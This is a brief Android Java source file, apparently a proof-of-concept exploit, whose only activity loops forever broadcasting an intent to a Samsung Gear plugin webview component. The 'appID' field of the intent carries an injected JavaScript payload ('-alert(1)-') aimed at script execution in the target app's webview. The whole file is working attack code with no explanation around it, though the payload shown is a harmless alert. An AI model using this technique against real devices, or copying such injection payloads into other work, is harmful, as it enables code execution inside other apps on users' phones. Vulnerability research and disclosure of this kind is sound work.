package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        new Thread(() -> {
            Intent i = new Intent("com.samsung.android.gearOPlugin.webviewuicontrol.SET_INSTALLED");
            i.putExtra("appID", "'-alert(1)-'");
            while (true) {
                sendBroadcast(i);
                try {
                    Thread.sleep(500);
                } catch (Throwable th) {
                    return;
                }
            }
        }).start();
    }
}